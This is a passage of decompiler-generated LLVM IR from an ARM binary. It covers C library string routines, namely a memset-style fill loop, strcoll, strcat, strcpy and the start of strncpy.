  %v5_d8c8 = icmp slt i32 %arg3, 8
  br i1 %v5_d8c8, label %dec_label_pc_d928, label %dec_label_pc_d8cc

dec_label_pc_d8cc:                                ; preds = %entry
  %v4_d8cc = mul i32 %arg2, 256
  %v5_d8cc = or i32 %v4_d8cc, %arg2
  %v4_d8d0 = mul i32 %v5_d8cc, 65536
  %v5_d8d0 = or i32 %v4_d8d0, %v5_d8cc
  store i32 %v5_d8d0, i32* @r1, align 4
  %v1_d8d457 = urem i32 %tmp, 4
  %v2_d8d458 = icmp eq i32 %v1_d8d457, 0
  store i1 %v2_d8d458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_d8d458, label %dec_label_pc_d8e4, label %bb

bb:                                               ; preds = %dec_label_pc_d8cc, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_d8cc ]
  %v3_d8d859 = phi i32 [ %v6_d8d8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_d8cc ]
  %v4_d8d8 = inttoptr i32 %v3_d8d859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_d8d8, align 1
  %v5_d8d8 = load i32, i32* @r3, align 4
  %v6_d8d8 = add i32 %v5_d8d8, 1
  store i32 %v6_d8d8, i32* @r3, align 4
  %v0_d8dc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_d8e8.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_d8dc.pr, label %dec_label_pc_d8e4, label %.thread

.thread:                                          ; preds = %bb
  %v2_d8dc = add i32 %v0_d8e8.pr.pre, -1
  store i32 %v2_d8dc, i32* %r2.global-to-local, align 4
  %v1_d8d4 = urem i32 %v6_d8d8, 4
  %v2_d8d4 = icmp eq i32 %v1_d8d4, 0
  store i1 %v2_d8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d8d4, label %dec_label_pc_d8e4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_d8d8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_d8d8.pre to i8
  br label %bb

dec_label_pc_d8e4:                                ; preds = %.thread, %bb, %dec_label_pc_d8cc
  %v0_d8f028 = phi i32 [ %tmp, %dec_label_pc_d8cc ], [ %v6_d8d8, %bb ], [ %v6_d8d8, %.thread ]
  %v0_d8e8.pr = phi i32 [ %arg3, %dec_label_pc_d8cc ], [ %v0_d8e8.pr.pre, %bb ], [ %v2_d8dc, %.thread ]
  %v0_d8e4 = load i32, i32* @r1, align 4
  store i32 %v0_d8e4, i32* @ip, align 4
  %v8_d8e810 = icmp eq i32 %v0_d8e8.pr, 8
  store i1 %v8_d8e810, i1* %cpsr_z.global-to-local, align 1
  %v5_d8ec11 = icmp slt i32 %v0_d8e8.pr, 8
  br i1 %v5_d8ec11, label %dec_label_pc_d928, label %dec_label_pc_d8f0.preheader

dec_label_pc_d8f0.preheader:                      ; preds = %dec_label_pc_d8e4
  %v1_d8f046 = inttoptr i32 %v0_d8f028 to i32*
  store i32 %v0_d8e4, i32* %v1_d8f046, align 4
  %v3_d8f047 = add i32 %v0_d8f028, 4
  %v4_d8f048 = inttoptr i32 %v3_d8f047 to i32*
  %v5_d8f049 = load i32, i32* @ip, align 4
  store i32 %v5_d8f049, i32* %v4_d8f048, align 4
  %v6_d8f050 = add i32 %v0_d8f028, 8
  store i32 %v6_d8f050, i32* @r3, align 4
  %v0_d8f451 = load i32, i32* %r2.global-to-local, align 4
  %v1_d8f452 = add i32 %v0_d8f451, -8
  store i32 %v1_d8f452, i32* %r2.global-to-local, align 4
  %v5_d8fc53 = icmp slt i32 %v1_d8f452, 8
  br i1 %v5_d8fc53, label %dec_label_pc_d8f0.dec_label_pc_d928.loopexit_crit_edge, label %dec_label_pc_d900

dec_label_pc_d900:                                ; preds = %dec_label_pc_d8f0.preheader, %dec_label_pc_d8e8.dec_label_pc_d8f0_crit_edge
  %v6_d8f055 = phi i32 [ %v6_d8f0, %dec_label_pc_d8e8.dec_label_pc_d8f0_crit_edge ], [ %v6_d8f050, %dec_label_pc_d8f0.preheader ]
  %v0_d8f054 = phi i32 [ %v12_d91c, %dec_label_pc_d8e8.dec_label_pc_d8f0_crit_edge ], [ %v0_d8f028, %dec_label_pc_d8f0.preheader ]
  %v1_d900 = inttoptr i32 %v6_d8f055 to i32*
  %v2_d900 = load i32, i32* @r1, align 4
  store i32 %v2_d900, i32* %v1_d900, align 4
  %v3_d900 = add i32 %v0_d8f054, 12
  %v4_d900 = inttoptr i32 %v3_d900 to i32*
  %v5_d900 = load i32, i32* @ip, align 4
  store i32 %v5_d900, i32* %v4_d900, align 4
  %v6_d900 = add i32 %v0_d8f054, 16
  store i32 %v6_d900, i32* @r3, align 4
  %v0_d904 = load i32, i32* %r2.global-to-local, align 4
  %v1_d904 = add i32 %v0_d904, -8
  store i32 %v1_d904, i32* %r2.global-to-local, align 4
  %v5_d90c = icmp slt i32 %v1_d904, 8
  br i1 %v5_d90c, label %dec_label_pc_d900.dec_label_pc_d928.loopexit_crit_edge, label %dec_label_pc_d910

dec_label_pc_d910:                                ; preds = %dec_label_pc_d900
  %v1_d910 = inttoptr i32 %v6_d900 to i32*
  %v2_d910 = load i32, i32* @r1, align 4
  store i32 %v2_d910, i32* %v1_d910, align 4
  %v3_d910 = add i32 %v0_d8f054, 20
  %v4_d910 = inttoptr i32 %v3_d910 to i32*
  %v5_d910 = load i32, i32* @ip, align 4
  store i32 %v5_d910, i32* %v4_d910, align 4
  %v6_d910 = add i32 %v0_d8f054, 24
  store i32 %v6_d910, i32* @r3, align 4
  %v0_d914 = load i32, i32* %r2.global-to-local, align 4
  %v1_d914 = add i32 %v0_d914, -8
  store i32 %v1_d914, i32* %r2.global-to-local, align 4
  %v5_d91c = icmp slt i32 %v1_d914, 8
  br i1 %v5_d91c, label %dec_label_pc_d910.dec_label_pc_d928.loopexit_crit_edge, label %dec_label_pc_d8e8

dec_label_pc_d8e8:                                ; preds = %dec_label_pc_d910
  %v7_d91c = inttoptr i32 %v6_d910 to i32*
  %v8_d91c = load i32, i32* @r1, align 4
  store i32 %v8_d91c, i32* %v7_d91c, align 4
  %v9_d91c = add i32 %v0_d8f054, 28
  %v10_d91c = inttoptr i32 %v9_d91c to i32*
  %v11_d91c = load i32, i32* @ip, align 4
  store i32 %v11_d91c, i32* %v10_d91c, align 4
  %v12_d91c = add i32 %v0_d8f054, 32
  store i32 %v12_d91c, i32* @r3, align 4
  %v6_d920 = load i32, i32* %r2.global-to-local, align 4
  %v7_d920 = add i32 %v6_d920, -8
  store i32 %v7_d920, i32* %r2.global-to-local, align 4
  %v5_d8ec = icmp slt i32 %v7_d920, 8
  br i1 %v5_d8ec, label %dec_label_pc_d8e8.dec_label_pc_d928.loopexit_crit_edge, label %dec_label_pc_d8e8.dec_label_pc_d8f0_crit_edge

dec_label_pc_d8e8.dec_label_pc_d8f0_crit_edge:    ; preds = %dec_label_pc_d8e8
  %v2_d8f0.pre = load i32, i32* @r1, align 4
  %v1_d8f0 = inttoptr i32 %v12_d91c to i32*
  store i32 %v2_d8f0.pre, i32* %v1_d8f0, align 4
  %v3_d8f0 = add i32 %v0_d8f054, 36
  %v4_d8f0 = inttoptr i32 %v3_d8f0 to i32*
  %v5_d8f0 = load i32, i32* @ip, align 4
  store i32 %v5_d8f0, i32* %v4_d8f0, align 4
  %v6_d8f0 = add i32 %v0_d8f054, 40
  store i32 %v6_d8f0, i32* @r3, align 4
  %v0_d8f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d8f4 = add i32 %v0_d8f4, -8
  store i32 %v1_d8f4, i32* %r2.global-to-local, align 4
  %v5_d8fc = icmp slt i32 %v1_d8f4, 8
  br i1 %v5_d8fc, label %dec_label_pc_d8f0.dec_label_pc_d928.loopexit_crit_edge, label %dec_label_pc_d900

dec_label_pc_d8e8.dec_label_pc_d928.loopexit_crit_edge: ; preds = %dec_label_pc_d8e8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d928

dec_label_pc_d8f0.dec_label_pc_d928.loopexit_crit_edge: ; preds = %dec_label_pc_d8e8.dec_label_pc_d8f0_crit_edge, %dec_label_pc_d8f0.preheader
  %v1_d8f4.lcssa = phi i32 [ %v1_d8f452, %dec_label_pc_d8f0.preheader ], [ %v1_d8f4, %dec_label_pc_d8e8.dec_label_pc_d8f0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d928

dec_label_pc_d900.dec_label_pc_d928.loopexit_crit_edge: ; preds = %dec_label_pc_d900
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d928

dec_label_pc_d910.dec_label_pc_d928.loopexit_crit_edge: ; preds = %dec_label_pc_d910
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d928

dec_label_pc_d928:                                ; preds = %dec_label_pc_d8e4, %dec_label_pc_d8e8.dec_label_pc_d928.loopexit_crit_edge, %dec_label_pc_d8f0.dec_label_pc_d928.loopexit_crit_edge, %dec_label_pc_d900.dec_label_pc_d928.loopexit_crit_edge, %dec_label_pc_d910.dec_label_pc_d928.loopexit_crit_edge, %entry
  %v0_d930 = phi i32 [ %arg3, %entry ], [ %v1_d914, %dec_label_pc_d910.dec_label_pc_d928.loopexit_crit_edge ], [ %v1_d904, %dec_label_pc_d900.dec_label_pc_d928.loopexit_crit_edge ], [ %v1_d8f4.lcssa, %dec_label_pc_d8f0.dec_label_pc_d928.loopexit_crit_edge ], [ %v7_d920, %dec_label_pc_d8e8.dec_label_pc_d928.loopexit_crit_edge ], [ %v0_d8e8.pr, %dec_label_pc_d8e4 ]
  %v2_d928 = icmp eq i32 %v0_d930, 0
  store i1 %v2_d928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d928, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_d928
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_d928
  %v1_d930 = sub i32 7, %v0_d930
  store i32 %v1_d930, i32* %r2.global-to-local, align 4
  %v3_d934 = mul i32 %v1_d930, 4
  %v4_d934 = add i32 %v3_d934, ptrtoint (i32* @global_var_d93c.269 to i32)
  call void @__pseudo_branch(i32 %v4_d934)
  %v0_d93c = load i32, i32* @r1, align 4
  %v1_d93c = trunc i32 %v0_d93c to i8
  %v2_d93c = load i32, i32* @r3, align 4
  %v3_d93c = inttoptr i32 %v2_d93c to i8*
  store i8 %v1_d93c, i8* %v3_d93c, align 1
  %v4_d93c = load i32, i32* @r3, align 4
  %v5_d93c = add i32 %v4_d93c, 1
  store i32 %v5_d93c, i32* %r3.global-to-local, align 4
  %v0_d940 = load i32, i32* @r1, align 4
  %v1_d940 = trunc i32 %v0_d940 to i8
  %v3_d940 = inttoptr i32 %v5_d93c to i8*
  store i8 %v1_d940, i8* %v3_d940, align 1
  %v4_d940 = load i32, i32* %r3.global-to-local, align 4
  %v5_d940 = add i32 %v4_d940, 1
  store i32 %v5_d940, i32* %r3.global-to-local, align 4
  %v0_d944 = load i32, i32* @r1, align 4
  %v1_d944 = trunc i32 %v0_d944 to i8
  %v3_d944 = inttoptr i32 %v5_d940 to i8*
  store i8 %v1_d944, i8* %v3_d944, align 1
  %v4_d944 = load i32, i32* %r3.global-to-local, align 4
  %v5_d944 = add i32 %v4_d944, 1
  store i32 %v5_d944, i32* %r3.global-to-local, align 4
  %v0_d948 = load i32, i32* @r1, align 4
  %v1_d948 = trunc i32 %v0_d948 to i8
  %v3_d948 = inttoptr i32 %v5_d944 to i8*
  store i8 %v1_d948, i8* %v3_d948, align 1
  %v4_d948 = load i32, i32* %r3.global-to-local, align 4
  %v5_d948 = add i32 %v4_d948, 1
  store i32 %v5_d948, i32* %r3.global-to-local, align 4
  %v0_d94c = load i32, i32* @r1, align 4
  %v1_d94c = trunc i32 %v0_d94c to i8
  %v3_d94c = inttoptr i32 %v5_d948 to i8*
  store i8 %v1_d94c, i8* %v3_d94c, align 1
  %v4_d94c = load i32, i32* %r3.global-to-local, align 4
  %v5_d94c = add i32 %v4_d94c, 1
  store i32 %v5_d94c, i32* %r3.global-to-local, align 4
  %v0_d950 = load i32, i32* @r1, align 4
  %v1_d950 = trunc i32 %v0_d950 to i8
  %v3_d950 = inttoptr i32 %v5_d94c to i8*
  store i8 %v1_d950, i8* %v3_d950, align 1
  %v4_d950 = load i32, i32* %r3.global-to-local, align 4
  %v5_d950 = add i32 %v4_d950, 1
  store i32 %v5_d950, i32* %r3.global-to-local, align 4
  %v0_d954 = load i32, i32* @r1, align 4
  %v1_d954 = trunc i32 %v0_d954 to i8
  %v3_d954 = inttoptr i32 %v5_d950 to i8*
  store i8 %v1_d954, i8* %v3_d954, align 1
  %v4_d954 = load i32, i32* %r3.global-to-local, align 4
  %v5_d954 = add i32 %v4_d954, 1
  store i32 %v5_d954, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_d8f0, { 1, 0 }
  uselistorder i32 %v12_d91c, { 1, 2, 0 }
  uselistorder i32 %v0_d8f054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_d8e8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_d8d8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_d8cc, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 0, 9, 8, 1, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_d928, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_d900, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_d964.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_d964 = phi i32 [ %v0_d964.pre, %bb ], [ %v5_d964, %bb3 ]
  %v0_d960 = phi i32 [ %tmp, %bb ], [ %v5_d960, %bb3 ]
  %v1_d960 = inttoptr i32 %v0_d960 to i8*
  %v2_d960 = load i8, i8* %v1_d960, align 1
  %v1_d964 = inttoptr i32 %v0_d964 to i8*
  %v2_d964 = load i8, i8* %v1_d964, align 1
  %v3_d964 = zext i8 %v2_d964 to i32
  %v5_d964 = add i32 %v0_d964, 1
  store i32 %v5_d964, i32* @r1, align 4
  %v2_d968 = icmp eq i8 %v2_d960, 0
  br i1 %v2_d968, label %.dec_label_pc_d974_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_d960 = add i32 %v0_d960, 1
  %v3_d960 = zext i8 %v2_d960 to i32
  %v10_d96c = icmp eq i8 %v2_d960, %v2_d964
  br i1 %v10_d96c, label %entry, label %dec_label_pc_d974

.dec_label_pc_d974_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_d974

dec_label_pc_d974:                                ; preds = %bb3, %.dec_label_pc_d974_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_d974_crit_edge ], [ %v3_d960, %bb3 ]
  %v2_d974.pre-phi = sub nsw i32 %.pn, %v3_d964
  ret i32 %v2_d974.pre-phi

; uselistorder directives
  uselistorder i32 %v5_d964, { 1, 0 }
  uselistorder i8 %v2_d960, { 0, 2, 1 }
  uselistorder i32 %v0_d960, { 1, 0 }
  uselistorder i32 %v0_d964, { 1, 0 }
  uselistorder label %dec_label_pc_d974, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d9e4

dec_label_pc_d9e4:                                ; preds = %dec_label_pc_d9e4, %entry
  %v0_d9e4 = phi i32 [ %v5_d9e4, %dec_label_pc_d9e4 ], [ %tmp, %entry ]
  %v1_d9e4 = inttoptr i32 %v0_d9e4 to i8*
  %v2_d9e4 = load i8, i8* %v1_d9e4, align 1
  %v5_d9e4 = add i32 %v0_d9e4, 1
  store i32 %v5_d9e4, i32* %r2.global-to-local, align 4
  %v2_d9e8 = icmp eq i8 %v2_d9e4, 0
  store i1 %v2_d9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d9e8, label %dec_label_pc_d9f0, label %dec_label_pc_d9e4

dec_label_pc_d9f0:                                ; preds = %dec_label_pc_d9e4
  %v1_d9f0 = add i32 %v0_d9e4, -1
  store i32 %v1_d9f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d9f4

dec_label_pc_d9f4:                                ; preds = %dec_label_pc_d9f4, %dec_label_pc_d9f0
  %v2_d9fc = phi i32 [ %v6_d9fc, %dec_label_pc_d9f4 ], [ %v1_d9f0, %dec_label_pc_d9f0 ]
  %v0_d9f4 = load i32, i32* @r1, align 4
  %v1_d9f4 = inttoptr i32 %v0_d9f4 to i8*
  %v2_d9f4 = load i8, i8* %v1_d9f4, align 1
  %v5_d9f4 = add i32 %v0_d9f4, 1
  store i32 %v5_d9f4, i32* @r1, align 4
  %v2_d9f8 = icmp eq i8 %v2_d9f4, 0
  store i1 %v2_d9f8, i1* %cpsr_z.global-to-local, align 1
  %v3_d9fc = add i32 %v2_d9fc, 1
  %v4_d9fc = inttoptr i32 %v3_d9fc to i8*
  store i8 %v2_d9f4, i8* %v4_d9fc, align 1
  %v5_d9fc = load i32, i32* %r2.global-to-local, align 4
  %v6_d9fc = add i32 %v5_d9fc, 1
  store i32 %v6_d9fc, i32* %r2.global-to-local, align 4
  %v0_da00 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da00, label %dec_label_pc_da04, label %dec_label_pc_d9f4

dec_label_pc_da04:                                ; preds = %dec_label_pc_d9f4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_d9fc, { 1, 0 }
  uselistorder i32 %v5_d9e4, { 1, 0 }
  uselistorder i32 %v0_d9e4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_da181 = load i32, i32* @r1, align 4
  %v1_da182 = inttoptr i32 %v0_da181 to i8*
  %v2_da183 = load i8, i8* %v1_da182, align 1
  %v2_da1c5 = icmp eq i8 %v2_da183, 0
  store i1 %v2_da1c5, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_da183, i8* %arg1, align 1
  br i1 %v2_da1c5, label %dec_label_pc_da28, label %dec_label_pc_da10

dec_label_pc_da10:                                ; preds = %entry, %dec_label_pc_da10
  %v0_da10 = load i32, i32* @r1, align 4
  %v1_da10 = add i32 %v0_da10, 1
  store i32 %v1_da10, i32* @r1, align 4
  %v0_da14 = load i32, i32* %r2.global-to-local, align 4
  %v1_da14 = add i32 %v0_da14, 1
  store i32 %v1_da14, i32* %r2.global-to-local, align 4
  %v1_da18 = inttoptr i32 %v1_da10 to i8*
  %v2_da18 = load i8, i8* %v1_da18, align 1
  %v2_da1c = icmp eq i8 %v2_da18, 0
  store i1 %v2_da1c, i1* %cpsr_z.global-to-local, align 1
  %v3_da20 = inttoptr i32 %v1_da14 to i8*
  store i8 %v2_da18, i8* %v3_da20, align 1
  %v0_da24 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da24, label %dec_label_pc_da28, label %dec_label_pc_da10

dec_label_pc_da28:                                ; preds = %dec_label_pc_da10, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_da10, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_da2c = icmp eq i32 %arg2, 3
  store i1 %v7_da2c, i1* %cpsr_z.global-to-local, align 1
  %v0_da30 = load i32, i32* @lr, align 4
  store i32 %v0_da30, i32* %stack_var_-4, align 4
  %v1_da34 = add i32 %arg1, -1
  store i32 %v1_da34, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_dab0, label %dec_label_pc_da3c

dec_label_pc_da3c:                                ; preds = %entry
  %v3_da3c = udiv i32 %arg2, 4
  store i32 %v3_da3c, i32* %lr.global-to-local, align 4
  %v0_da40.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_da40

dec_label_pc_da40:                                ; preds = %dec_label_pc_da8c, %dec_label_pc_da3c
  %v2_da48 = phi i32 [ %v6_da80, %dec_label_pc_da8c ], [ %v1_da34, %dec_label_pc_da3c ]
  %v0_da40 = phi i32 [ %v1_da90, %dec_label_pc_da8c ], [ %v0_da40.pre, %dec_label_pc_da3c ]
  %v1_da40 = inttoptr i32 %v0_da40 to i8*
  %v2_da40 = load i8, i8* %v1_da40, align 1
  %v3_da40 = zext i8 %v2_da40 to i32
  store i32 %v3_da40, i32* %r3.global-to-local, align 4
  %v2_da44 = icmp eq i8 %v2_da40, 0
  store i1 %v2_da44, i1* %cpsr_z.global-to-local, align 1
  %v3_da48 = add i32 %v2_da48, 1
  %v4_da48 = inttoptr i32 %v3_da48 to i8*
  store i8 %v2_da40, i8* %v4_da48, align 1
  %v5_da48 = load i32, i32* @ip, align 4
  %v6_da48 = add i32 %v5_da48, 1
  store i32 %v6_da48, i32* @ip, align 4
  %v0_da4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da4c, label %dec_label_pc_da9c, label %dec_label_pc_da50

dec_label_pc_da50:                                ; preds = %dec_label_pc_da40
  %v0_da50 = load i32, i32* @r1, align 4
  %v1_da50 = add i32 %v0_da50, 1
  %v2_da50 = inttoptr i32 %v1_da50 to i8*
  %v3_da50 = load i8, i8* %v2_da50, align 1
  %v4_da50 = zext i8 %v3_da50 to i32
  store i32 %v4_da50, i32* %r3.global-to-local, align 4
  %v2_da54 = icmp eq i8 %v3_da50, 0
  store i1 %v2_da54, i1* %cpsr_z.global-to-local, align 1
  %v3_da58 = add i32 %v5_da48, 2
  %v4_da58 = inttoptr i32 %v3_da58 to i8*
  store i8 %v3_da50, i8* %v4_da58, align 1
  %v5_da58 = load i32, i32* @ip, align 4
  %v6_da58 = add i32 %v5_da58, 1
  store i32 %v6_da58, i32* @ip, align 4
  %v0_da5c = load i32, i32* @r1, align 4
  %v1_da5c = add i32 %v0_da5c, 1
  store i32 %v1_da5c, i32* %r1.global-to-local, align 4
  %v0_da60 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da60, label %dec_label_pc_da9c, label %dec_label_pc_da64

dec_label_pc_da64:                                ; preds = %dec_label_pc_da50
  %v1_da64 = add i32 %v0_da5c, 2
  %v2_da64 = inttoptr i32 %v1_da64 to i8*
  %v3_da64 = load i8, i8* %v2_da64, align 1
  %v4_da64 = zext i8 %v3_da64 to i32
  store i32 %v4_da64, i32* %r3.global-to-local, align 4
  %v2_da68 = icmp eq i8 %v3_da64, 0
  store i1 %v2_da68, i1* %cpsr_z.global-to-local, align 1
  %v3_da6c = add i32 %v5_da58, 2
  %v4_da6c = inttoptr i32 %v3_da6c to i8*
  store i8 %v3_da64, i8* %v4_da6c, align 1
  %v5_da6c = load i32, i32* @ip, align 4
  %v6_da6c = add i32 %v5_da6c, 1
  store i32 %v6_da6c, i32* @ip, align 4
  %v0_da70 = load i32, i32* %r1.global-to-local, align 4
  %v1_da70 = add i32 %v0_da70, 1
  store i32 %v1_da70, i32* %r1.global-to-local, align 4
  %v0_da74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da74, label %dec_label_pc_da9c, label %dec_label_pc_da78

dec_label_pc_da78:                                ; preds = %dec_label_pc_da64
  %v1_da78 = add i32 %v0_da70, 2
  %v2_da78 = inttoptr i32 %v1_da78 to i8*
  %v3_da78 = load i8, i8* %v2_da78, align 1
  %v4_da78 = zext i8 %v3_da78 to i32
  store i32 %v4_da78, i32* %r3.global-to-local, align 4
  %v2_da7c = icmp eq i8 %v3_da78, 0
  store i1 %v2_da7c, i1* %cpsr_z.global-to-local, align 1
  %v3_da80 = add i32 %v5_da6c, 2
  %v4_da80 = inttoptr i32 %v3_da80 to i8*
  store i8 %v3_da78, i8* %v4_da80, align 1
  %v5_da80 = load i32, i32* @ip, align 4
  %v6_da80 = add i32 %v5_da80, 1
  store i32 %v6_da80, i32* @ip, align 4
  %v0_da84 = load i32, i32* %r1.global-to-local, align 4
  %v1_da84 = add i32 %v0_da84, 1
  store i32 %v1_da84, i32* %r1.global-to-local, align 4
  %v0_da88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_da88, label %dec_label_pc_da9c, label %dec_label_pc_da8c

dec_label_pc_da8c:                                ; preds = %dec_label_pc_da78
  %v0_da8c = load i32, i32* %lr.global-to-local, align 4
  %v1_da8c = add i32 %v0_da8c, -1
  store i32 %v1_da8c, i32* %lr.global-to-local, align 4
  %v7_da8c = icmp eq i32 %v0_da8c, 1
  store i1 %v7_da8c, i1* %cpsr_z.global-to-local, align 1
  %v1_da90 = add i32 %v0_da84, 2
  store i32 %v1_da90, i32* @r1, align 4
  br i1 %v7_da8c, label %dec_label_pc_dab0, label %dec_label_pc_da40

dec_label_pc_da9c:                                ; preds = %dec_label_pc_da78, %dec_label_pc_da64, %dec_label_pc_da50, %dec_label_pc_da40
  %v1_da9c = phi i32 [ %v6_da80, %dec_label_pc_da78 ], [ %v6_da6c, %dec_label_pc_da64 ], [ %v6_da58, %dec_label_pc_da50 ], [ %v6_da48, %dec_label_pc_da40 ]
  %v2_da9c1 = sub i32 %arg1, %v1_da9c
  %v2_daa0 = add i32 %v2_da9c1, %arg2
  %v1_daa4 = add i32 %v2_daa0, -1
  store i32 %v1_daa4, i32* %r3.global-to-local, align 4
  %v7_daa4 = icmp eq i32 %v2_daa0, 1
  store i1 %v7_daa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_daa4, label %dec_label_pc_dae0, label %dec_label_pc_dad0

dec_label_pc_dab0:                                ; preds = %dec_label_pc_da8c, %entry
  %v2_dac07 = phi i32 [ %v1_da34, %entry ], [ %v6_da80, %dec_label_pc_da8c ]
  %v1_dab0 = urem i32 %arg2, 4
  store i32 %v1_dab0, i32* %r3.global-to-local, align 4
  %v2_dab0 = icmp eq i32 %v1_dab0, 0
  store i1 %v2_dab0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dab0, label %dec_label_pc_dae0, label %dec_label_pc_dab8

dec_label_pc_dab8:                                ; preds = %dec_label_pc_dab0, %dec_label_pc_dac8.dec_label_pc_dab8_crit_edge
  %v2_dac0 = phi i32 [ %v6_dac0, %dec_label_pc_dac8.dec_label_pc_dab8_crit_edge ], [ %v2_dac07, %dec_label_pc_dab0 ]
  %v0_dabc = phi i32 [ %v0_dabc.pre, %dec_label_pc_dac8.dec_label_pc_dab8_crit_edge ], [ %v1_dab0, %dec_label_pc_dab0 ]
  %v0_dab8 = load i32, i32* @r1, align 4
  %v1_dab8 = inttoptr i32 %v0_dab8 to i8*
  %v2_dab8 = load i8, i8* %v1_dab8, align 1
  %v3_dab8 = zext i8 %v2_dab8 to i32
  store i32 %v3_dab8, i32* %r2.global-to-local, align 4
  %v5_dab8 = add i32 %v0_dab8, 1
  store i32 %v5_dab8, i32* @r1, align 4
  %v1_dabc = add i32 %v0_dabc, -1
  store i32 %v1_dabc, i32* %r3.global-to-local, align 4
  %v7_dabc = icmp eq i32 %v0_dabc, 1
  store i1 %v7_dabc, i1* %cpsr_z.global-to-local, align 1
  %v3_dac0 = add i32 %v2_dac0, 1
  %v4_dac0 = inttoptr i32 %v3_dac0 to i8*
  store i8 %v2_dab8, i8* %v4_dac0, align 1
  %v5_dac0 = load i32, i32* @ip, align 4
  %v6_dac0 = add i32 %v5_dac0, 1
  store i32 %v6_dac0, i32* @ip, align 4
  %v0_dac4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dac4, label %dec_label_pc_dae0, label %dec_label_pc_dac8

dec_label_pc_dac8:                                ; preds = %dec_label_pc_dab8
  %v0_dac8 = load i32, i32* %r2.global-to-local, align 4
  %v2_dac8 = icmp eq i32 %v0_dac8, 0
  store i1 %v2_dac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_dac8, label %dec_label_pc_dad0, label %dec_label_pc_dac8.dec_label_pc_dab8_crit_edge

dec_label_pc_dac8.dec_label_pc_dab8_crit_edge:    ; preds = %dec_label_pc_dac8
  %v0_dabc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dab8

